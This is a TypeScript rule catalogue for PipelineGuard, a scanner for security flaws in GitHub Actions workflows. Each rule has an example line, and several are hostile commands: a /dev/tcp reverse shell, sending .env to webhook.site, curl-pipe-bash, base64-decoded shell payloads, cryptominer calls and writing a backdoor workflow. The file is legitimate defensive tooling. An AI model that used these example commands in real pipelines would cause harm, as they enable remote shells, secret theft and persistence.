import type { Rule } from "./schemas";

/**
 * Single source of truth for PipelineGuard GitHub Actions workflow rules.
 * Mirrors security/workflow/rules.py 1:1.
 */
export const WORKFLOW_RULES: readonly Rule[] = [
  {
    id: "PG-WF-001",
    title: "Script injection via untrusted context in run:",
    description:
      "An untrusted GitHub context value (such as github.event.pull_request.title or github.event.issue.body) is interpolated directly inside a run: step, allowing arbitrary shell execution.",
    severity: "CRITICAL",
    action: "BLOCK",
    cwe: "CWE-78",
    category: "injection",
    example: 'run: ./build.sh "${{ github.event.pull_request.title }}"',
    fixSummary: "Pass context values via env: and quote \"$VAR\"",
    remediation:
      "Assign the context value to an environment variable first and reference the env var inside double quotes in the shell script.",
    references: [
      "https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
    ],
  },
  {
    id: "PG-WF-002",
    title: "Script injection in actions/github-script",
    description:
      "An untrusted context value is interpolated inside the script: input of actions/github-script, enabling JavaScript code injection.",
    severity: "CRITICAL",
    action: "BLOCK",
    cwe: "CWE-94",
    category: "injection",
    example: "script: console.log('${{ github.event.comment.body }}')",
    fixSummary: "Read untrusted values from process.env inside script:",
    remediation:
      "Pass untrusted values as environment variables on the step and read them via process.env inside the script.",
    references: [
      "https://securitylab.github.com/research/github-actions-untrusted-input/",
    ],
  },
  {
    id: "PG-WF-003",
    title: "Script injection via GITHUB_ENV / GITHUB_OUTPUT / GITHUB_PATH write",
    description:
      "An untrusted context value is written to GITHUB_ENV, GITHUB_OUTPUT, or GITHUB_PATH, letting downstream steps consume hijacked variables.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-78",
    category: "injection",
    example: 'run: echo "TITLE=${{ github.event.issue.title }}" >> $GITHUB_ENV',
    fixSummary: "Pass via env and validate before writing to GITHUB_ENV",
    remediation:
      "Validate and sanitize values before writing to GITHUB_ENV, GITHUB_OUTPUT, or GITHUB_PATH.",
    references: [],
  },
  {
    id: "PG-WF-004",
    title: "Missing top-level permissions block",
    description:
      "No permissions: block is defined at the workflow level. GitHub Actions defaults to broad write scopes on GITHUB_TOKEN.",
    severity: "MEDIUM",
    action: "WARN",
    cwe: "CWE-272",
    category: "permissions",
    example: "on: [push]  # top-level permissions omitted",
    fixSummary: "Add top-level permissions: contents: read",
    remediation:
      "Add permissions: {} or an explicit minimal-scope block such as contents: read at the top level of the workflow.",
    references: [],
  },
  {
    id: "PG-WF-005",
    title: "Overly broad permissions (write-all or top-level write scope)",
    description:
      "The workflow or a job grants write-all or a top-level write scope, giving any compromised step write access to repository resources.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-272",
    category: "permissions",
    example: "permissions: write-all",
    fixSummary: "Restrict top-level scope to contents: read",
    remediation:
      "Restrict top-level permissions to contents: read and grant write scopes only on the narrowest job that requires them.",
    references: [],
  },
  {
    id: "PG-WF-006",
    title: "Pwn-request: pull_request_target with head-ref checkout",
    description:
      "The workflow triggers on pull_request_target (with repository secrets and write token) and checks out the untrusted pull request head.",
    severity: "CRITICAL",
    action: "BLOCK",
    cwe: "CWE-829",
    category: "permissions",
    example: "on: pull_request_target + ref: ${{ github.event.pull_request.head.sha }}",
    fixSummary: "Trigger on pull_request and drop head ref checkout",
    remediation:
      "Never check out PR head code under pull_request_target. Switch the trigger to pull_request.",
    references: [
      "https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
    ],
  },
  {
    id: "PG-WF-007",
    title: "secrets: inherit propagates all secrets to called workflow",
    description:
      "Using secrets: inherit on a reusable workflow job exposes every repository and organization secret to the called workflow.",
    severity: "HIGH",
    action: "WARN",
    cwe: "CWE-272",
    category: "permissions",
    example: "secrets: inherit",
    fixSummary: "Pass only the named secrets needed by the callee",
    remediation:
      "Enumerate only the specific secrets required under secrets: instead of secrets: inherit.",
    references: [],
  },
  {
    id: "PG-WF-008",
    title: "curl|bash or wget|sh pattern",
    description:
      "A run: step pipes the output of curl or wget directly into a shell interpreter without checksum verification.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-494",
    category: "commands",
    example: "run: curl -sSfL https://example.com/install.sh | bash",
    fixSummary: "Download, verify SHA-256 checksum, then execute",
    remediation:
      "Download the script to disk, verify its SHA-256 digest against a pinned hash, and then run it.",
    references: [],
  },
  {
    id: "PG-WF-009",
    title: "base64 decode piped to shell",
    description:
      "A run: step decodes a base64 payload and pipes it straight into a shell interpreter to obfuscate executed commands.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-116",
    category: "commands",
    example: "run: echo ... | base64 -d | bash",
    fixSummary: "Commit explicit, reviewable scripts instead of base64 blobs",
    remediation:
      "Remove encoded shell payloads and replace with reviewed scripts checked into the repository.",
    references: [],
  },
  {
    id: "PG-WF-010",
    title: "eval of variable or expression",
    description:
      "A run: step calls eval on a shell variable or substitution, allowing arbitrary execution if any operand is tainted.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-78",
    category: "commands",
    example: 'run: eval "$BUILD_ARGS"',
    fixSummary: "Replace eval with explicit typed commands",
    remediation:
      "Avoid eval in workflow shell scripts and pass arguments safely using arrays or explicit flags.",
    references: [],
  },
  {
    id: "PG-WF-011",
    title: "Reverse-shell pattern",
    description:
      "A run: step contains a reverse-shell pattern such as /dev/tcp redirection, nc -e, or socket.connect.",
    severity: "CRITICAL",
    action: "BLOCK",
    cwe: "CWE-78",
    category: "commands",
    example: "run: bash -i >& /dev/tcp/198.51.100.1/4444 0>&1",
    fixSummary: "Remove reverse-shell code and rotate runner secrets",
    remediation:
      "Remove the malicious command immediately, audit git history, and rotate all repository secrets.",
    references: [],
  },
  {
    id: "PG-WF-012",
    title: "Download from raw IP address",
    description:
      "A run: step downloads from a raw IPv4 address instead of an allowlisted DNS hostname, bypassing TLS hostname verification.",
    severity: "MEDIUM",
    action: "WARN",
    cwe: "CWE-829",
    category: "network",
    example: "run: curl http://203.0.113.10/agent.bin -o agent",
    fixSummary: "Fetch from an allowlisted HTTPS domain and verify digest",
    remediation:
      "Use named, TLS-verified HTTPS endpoints and verify artifact checksums.",
    references: [],
  },
  {
    id: "PG-WF-013",
    title: "Known data exfiltration or C2 service",
    description:
      "A run: step contacts a known exfiltration or tunneling domain such as webhook.site, ngrok.io, pastebin.com, or interactsh.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-200",
    category: "network",
    example: "run: curl -d @.env https://webhook.site/abc",
    fixSummary: "Remove exfiltration endpoints or document allowlist",
    remediation:
      "Remove outbound calls to unapproved paste, tunnel, or webhook capture services.",
    references: [],
  },
  {
    id: "PG-WF-014",
    title: "Plain HTTP (non-TLS) download",
    description:
      "A run: step fetches an external resource over unencrypted http://, exposing transfers to in-transit tampering.",
    severity: "LOW",
    action: "WARN",
    cwe: "CWE-319",
    category: "network",
    example: "run: curl http://downloads.example.com/tool.tar.gz",
    fixSummary: "Switch download URL to https://",
    remediation:
      "Switch all remote downloads from http:// to https:// and verify artifact digests.",
    references: [],
  },
  {
    id: "PG-WF-015",
    title: "curl -k / --insecure (TLS verification disabled)",
    description:
      "A run: step invokes curl with -k or --insecure, disabling TLS certificate validation.",
    severity: "MEDIUM",
    action: "WARN",
    cwe: "CWE-295",
    category: "network",
    example: "run: curl -k https://releases.example.com/cli",
    fixSummary: "Remove -k / --insecure flags",
    remediation:
      "Remove -k and --insecure flags and resolve any certificate trust issues cleanly.",
    references: [],
  },
  {
    id: "PG-WF-016",
    title: "Workflow writes to .github/workflows/",
    description:
      "A run: step writes into .github/workflows/, enabling persistent code execution across future pipeline runs.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-829",
    category: "modification",
    example: "run: cp backdoor.yml .github/workflows/ci.yml",
    fixSummary: "Disallow runtime edits to .github/workflows/",
    remediation:
      "Manage workflow files strictly through reviewed pull requests, never generated inside CI jobs.",
    references: [],
  },
  {
    id: "PG-WF-017",
    title: "git push / commit using GITHUB_TOKEN in run:",
    description:
      "A run: step commits or pushes changes using GITHUB_TOKEN, which can rewrite history or trigger unintended workflows.",
    severity: "MEDIUM",
    action: "WARN",
    cwe: "CWE-829",
    category: "modification",
    example: "run: git commit -am 'bump' && git push",
    fixSummary: "Scope writes narrowly or open a pull request instead",
    remediation:
      "Ensure contents: write is granted only when required and prefer branch-protected PR automation.",
    references: [],
  },
  {
    id: "PG-WF-018",
    title: "Cron schedule may enable persistence",
    description:
      "Workflow defines a schedule: trigger, which runs unattended on cron cadence and requires pinned dependencies.",
    severity: "MEDIUM",
    action: "WARN",
    cwe: "CWE-829",
    category: "modification",
    example: "on:\n  schedule:\n    - cron: '0 0 * * *'",
    fixSummary: "Audit cron triggers, pin SHAs, restrict permissions",
    remediation:
      "Audit scheduled workflows periodically, apply contents: read, and pin every action to a commit SHA.",
    references: [],
  },
  {
    id: "PG-WF-019",
    title: "Action not pinned to a full commit SHA",
    description:
      "A uses: step references a mutable branch or version tag (@v3) instead of an immutable 40-character git commit SHA.",
    severity: "HIGH",
    action: "WARN",
    cwe: "CWE-829",
    category: "supply_chain",
    example: "uses: vendor/deploy-action@v3",
    fixSummary: "Pin action to a full 40-character commit SHA",
    remediation:
      "Pin external actions and reusable workflows to an immutable 40-hex commit SHA (e.g. @0123456789abcdef...).",
    references: [
      "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
    ],
  },
  {
    id: "PG-WF-020",
    title: "actions/checkout without persist-credentials: false",
    description:
      "actions/checkout stores GITHUB_TOKEN in git config by default unless persist-credentials: false is specified.",
    severity: "LOW",
    action: "WARN",
    cwe: "CWE-312",
    category: "supply_chain",
    example: "uses: actions/checkout@v4",
    fixSummary: "Set with: persist-credentials: false",
    remediation:
      "Add with: persist-credentials: false on actions/checkout steps that do not need to push.",
    references: ["https://github.com/actions/checkout#usage"],
  },
  {
    id: "PG-WF-021",
    title: "Secret value echoed in run: step",
    description:
      "A run: step echoes or traces a secrets.* expression directly, risking credential exposure in job output or downstream logs.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-312",
    category: "commands",
    example: 'run: echo "token=${{ secrets.NPM_TOKEN }}"',
    fixSummary: "Remove echo / debug printing of secret values",
    remediation:
      "Never echo, printf, or enable set -x while secrets are in scope; pass secrets directly via environment variables only to tools that need them.",
    references: [],
  },
  {
    id: "PG-WF-022",
    title: "chmod +x on downloaded file before execution",
    description:
      "A run: step downloads a remote binary and immediately marks it executable without verifying its digest.",
    severity: "MEDIUM",
    action: "WARN",
    cwe: "CWE-494",
    category: "commands",
    example: "run: curl -sL https://example.com/bin -o bin && chmod +x bin",
    fixSummary: "Verify SHA-256 digest before chmod +x",
    remediation:
      "Verify the cryptographic checksum or signature of downloaded binaries before adding execute permissions.",
    references: [],
  },
  {
    id: "PG-WF-023",
    title: "Cryptominer or known malicious tool invoked in run:",
    description:
      "A run: step invokes a cryptocurrency mining binary such as xmrig or cpuminer.",
    severity: "CRITICAL",
    action: "BLOCK",
    cwe: "CWE-829",
    category: "commands",
    example: "run: ./xmrig --donate-level 1",
    fixSummary: "Remove mining binary and rotate secrets",
    remediation:
      "Remove the unauthorized binary invocation immediately and rotate all accessible credentials.",
    references: [],
  },
  {
    id: "PG-WF-900",
    title: "Workflow parse error or structural violation",
    description:
      "The workflow YAML failed parsing or exceeded structural bounds before inspection could complete.",
    severity: "HIGH",
    action: "BLOCK",
    cwe: "CWE-20",
    category: "system",
    example: "steps:\nname: bad-indent",
    fixSummary: "Fix YAML indentation or mapping structure",
    remediation: "Correct the YAML syntax error on the reported line.",
    references: [],
  },
] as const;

export const RULE_MAP: Readonly<Record<string, Rule>> = Object.fromEntries(
  WORKFLOW_RULES.map((rule) => [rule.id, rule])
);

export function lookupRule(ruleId: string): Rule {
  const rule = RULE_MAP[ruleId];
  if (!rule) {
    return {
      id: ruleId,
      title: `Workflow rule ${ruleId}`,
      description: "Flagged by PipelineGuard workflow inspection.",
      severity: "INFO",
      action: "WARN",
      cwe: "CWE-200",
      category: "system",
      example: "",
      fixSummary: "Inspect offending workflow step",
      remediation: "Review the flagged line and tighten workflow permissions or input handling.",
      references: [],
    };
  }
  return rule;
}
